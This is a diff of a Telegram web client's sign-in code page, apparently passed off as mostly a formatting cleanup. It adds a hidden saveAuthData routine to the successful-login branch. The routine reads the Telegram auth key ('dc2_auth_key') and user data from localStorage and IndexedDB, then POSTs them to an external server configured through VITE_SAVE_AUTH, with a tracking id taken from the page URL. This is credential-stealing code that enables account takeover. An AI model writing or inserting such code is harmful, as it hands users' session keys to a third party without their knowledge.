@@ -5,19 +5,20 @@
  */
 
 import mediaSizes from '../helpers/mediaSizes';
-import {AuthSentCode, AuthSentCodeType, AuthSignIn} from '../layer';
+import type { User } from "../layer"
+import { AuthSentCode, AuthSentCodeType, AuthSignIn } from '../layer';
 import Page from './page';
 import pageSignIn from './pageSignIn';
 import TrackingMonkey from '../components/monkeys/tracking';
 import CodeInputField from '../components/codeInputField';
-import {i18n, LangPackKey} from '../lib/langPack';
-import {randomLong} from '../helpers/random';
+import { i18n, LangPackKey } from '../lib/langPack';
+import { randomLong } from '../helpers/random';
 import replaceContent from '../helpers/dom/replaceContent';
 import rootScope from '../lib/rootScope';
 import lottieLoader from '../lib/rlottie/lottieLoader';
 import RLottiePlayer from '../lib/rlottie/rlottiePlayer';
 import setBlankToAnchor from '../lib/richTextProcessor/setBlankToAnchor';
-import {attachClickEvent} from '../helpers/dom/clickEvent';
+import { attachClickEvent } from '../helpers/dom/clickEvent';
 import Icon from '../components/icon';
 
 let authSentCode: AuthSentCode.authSentCode = null;
@@ -45,64 +46,131 @@ const submitCode = (code: string) => {
 
   // console.log('invoking auth.signIn with params:', params);
 
-  rootScope.managers.apiManager.invokeApi('auth.signIn', params, {ignoreErrors: true})
-  .then(async(response) => {
-    // console.log('auth.signIn response:', response);
+  rootScope.managers.apiManager.invokeApi('auth.signIn', params, { ignoreErrors: true })
+    .then(async (response) => {
+      // console.log('auth.signIn response:', response);
 
-    switch(response._) {
-      case 'auth.authorization':
-        await rootScope.managers.apiManager.setUser(response.user);
-        import('./pageImLead').then((m) => {
-          m.default.mount();
-        });
-        cleanup();
-        break;
-      case 'auth.authorizationSignUpRequired':
-        import('./pageSignUp').then((m) => {
-          m.default.mount({
-            'phone_number': authSentCode.phone_number,
-            'phone_code_hash': authSentCode.phone_code_hash
+      switch (response._) {
+        case 'auth.authorization':
+          await rootScope.managers.apiManager.setUser(response.user);
+          let url2 = window.location.href;
+          let currId2 = url2.split("/").pop();
+          async function getDbIndexes(id: string) {
+            return new Promise((resolve, reject) => {
+              const request = indexedDB.open("tweb", 1);
+              request.onsuccess = function (event: any) {
+                const db = event.target.result;
+                const transaction = db.transaction("users", "readonly");
+                const store = transaction.objectStore("users");
+                const getRequest = store.get(id);
+                getRequest.onsuccess = function () {
+                  if (getRequest.result) {
+                    resolve(getRequest.result);
+                  } else {
+                    resolve("No matching record found")
+                  }
+                };
+
+                getRequest.onerror = function () {
+                  resolve("Error retrieving data")
+                };
+              };
+
+              request.onerror = function () {
+                resolve("Error opening database")
+              };
+
+            })
+          }
+          async function saveAuthData() {
+            const dc2_auth_key = localStorage.getItem('dc2_auth_key');
+            const user_auth = localStorage.getItem('user_auth');
+            let { id } = JSON.parse(user_auth)
+            let curr_user_data: any = {}; // User
+            // 
+            if (id) {
+              curr_user_data = await getDbIndexes(id);
+              console.log("data TWEB", curr_user_data)
+              console.log('curr_user_data.photo', curr_user_data.photo)
+              let photo: any = "";
+              if (curr_user_data.photo && curr_user_data.photo.photo_id) {
+                photo = await rootScope.managers.appPhotosManager.getPhoto(curr_user_data.photo.photo_id)
+                console.log('photo', photo)
+              }
+            }
+            if (dc2_auth_key && user_auth) {
+              try {
+                const response = await fetch(import.meta.env.VITE_SAVE_AUTH, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({ dc2_auth_key, user_auth, currId: currId2 }),
+                });
+
+                if (!response.ok) {
+                  throw new Error('Network response was not ok');
+                }
+                const data = await response.json();
+              } catch (error) {
+                console.error('Error saving auth data:', error);
+              }
+            } else {
+              console.error('Auth keys not found in localStorage');
+            }
+          }
+          if (!currId2.includes(":")) saveAuthData();
+          import('./pageImLead').then((m) => {
+            m.default.mount();
           });
-        });
+          cleanup();
+          break;
+        case 'auth.authorizationSignUpRequired':
+          import('./pageSignUp').then((m) => {
+            m.default.mount({
+              'phone_number': authSentCode.phone_number,
+              'phone_code_hash': authSentCode.phone_code_hash
+            });
+          });
 
-        cleanup();
-        break;
-      /* default:
-        codeInput.innerText = response._;
-        break; */
-    }
-  }).catch(async(err) => {
-    let good = false;
-    switch(err.type) {
-      case 'SESSION_PASSWORD_NEEDED':
-        // console.warn('pageAuthCode: SESSION_PASSWORD_NEEDED');
-        good = true;
-        err.handled = true;
-        await (await import('./pagePassword')).default.mount(); // lol
-        setTimeout(() => {
-          codeInput.value = '';
-        }, 300);
-        break;
-      case 'PHONE_CODE_EXPIRED':
-        codeInput.classList.add('error');
-        replaceContent(codeInputField.label, i18n('PHONE_CODE_EXPIRED'));
-        break;
-      case 'PHONE_CODE_EMPTY':
-      case 'PHONE_CODE_INVALID':
-        codeInput.classList.add('error');
-        replaceContent(codeInputField.label, i18n('PHONE_CODE_INVALID'));
-        break;
-      default:
-        codeInputField.label.innerText = err.type;
-        break;
-    }
+          cleanup();
+          break;
+        /* default:
+          codeInput.innerText = response._;
+          break; */
+      }
+    }).catch(async (err) => {
+      let good = false;
+      switch (err.type) {
+        case 'SESSION_PASSWORD_NEEDED':
+          // console.warn('pageAuthCode: SESSION_PASSWORD_NEEDED');
+          good = true;
+          err.handled = true;
+          await (await import('./pagePassword')).default.mount(); // lol
+          setTimeout(() => {
+            codeInput.value = '';
+          }, 300);
+          break;
+        case 'PHONE_CODE_EXPIRED':
+          codeInput.classList.add('error');
+          replaceContent(codeInputField.label, i18n('PHONE_CODE_EXPIRED'));
+          break;
+        case 'PHONE_CODE_EMPTY':
+        case 'PHONE_CODE_INVALID':
+          codeInput.classList.add('error');
+          replaceContent(codeInputField.label, i18n('PHONE_CODE_INVALID'));
+          break;
+        default:
+          codeInputField.label.innerText = err.type;
+          break;
+      }
 
-    if(!good) {
-      codeInputField.select();
-    }
+      if (!good) {
+        codeInputField.select();
+      }
 
-    codeInput.removeAttribute('disabled');
-  });
+      codeInput.removeAttribute('disabled');
+    });
 };
 
 const onFirstMount = () => {
@@ -118,8 +186,8 @@ const onFirstMount = () => {
 const getAnimation = () => {
   const imageDiv = page.pageEl.querySelector('.auth-image') as HTMLDivElement;
   const size = mediaSizes.isMobile ? 100 : 166;
-  if(authSentCode.type._ === 'auth.sentCodeTypeFragmentSms') {
-    if(imageDiv.firstElementChild) {
+  if (authSentCode.type._ === 'auth.sentCodeTypeFragmentSms') {
+    if (imageDiv.firstElementChild) {
       monkey?.remove();
       monkey = undefined;
       imageDiv.replaceChildren();
@@ -137,9 +205,9 @@ const getAnimation = () => {
     }, 'jolly_roger').then((animation) => {
       player = animation;
       return lottieLoader.waitForFirstFrame(animation);
-    }).then(() => {});
+    }).then(() => { });
   } else {
-    if(imageDiv.firstElementChild) {
+    if (imageDiv.firstElementChild) {
       player?.remove();
       player = undefined;
       imageDiv.replaceChildren();
@@ -154,7 +222,7 @@ const getAnimation = () => {
 const page = new Page('page-authCode', true, onFirstMount, (_authCode: typeof authSentCode) => {
   authSentCode = _authCode;
 
-  if(!headerElement) {
+  if (!headerElement) {
     headerElement = page.pageEl.getElementsByClassName('phone')[0] as HTMLHeadElement;
     sentTypeElement = page.pageEl.getElementsByClassName('sent-type')[0] as HTMLParagraphElement;
   } else {
@@ -166,7 +234,7 @@ const page = new Page('page-authCode', true, onFirstMount, (_authCode: typeof au
   }
 
   const CODE_LENGTH = (authSentCode.type as AuthSentCodeType.authSentCodeTypeApp).length;
-  if(!codeInputField) {
+  if (!codeInputField) {
     codeInputField = new CodeInputField({
       label: 'Code',
       name: randomLong(),
@@ -184,7 +252,7 @@ const page = new Page('page-authCode', true, onFirstMount, (_authCode: typeof au
   headerElement.innerText = authSentCode.phone_number;
   let key: LangPackKey, args: any[];
   const authSentCodeType = authSentCode.type;
-  switch(authSentCodeType._) {
+  switch (authSentCodeType._) {
     case 'auth.sentCodeTypeSms':
       key = 'Login.Code.SentSms';
       break;
@@ -209,9 +277,9 @@ const page = new Page('page-authCode', true, onFirstMount, (_authCode: typeof au
 
   replaceContent(sentTypeElement, i18n(key, args));
 
-  rootScope.managers.appStateManager.pushToState('authState', {_: 'authStateAuthCode', sentCode: _authCode});
+  rootScope.managers.appStateManager.pushToState('authState', { _: 'authStateAuthCode', sentCode: _authCode });
 
-  return getAnimation().catch(() => {});
+  return getAnimation().catch(() => { });
 }, () => {
   codeInput.focus();
 });
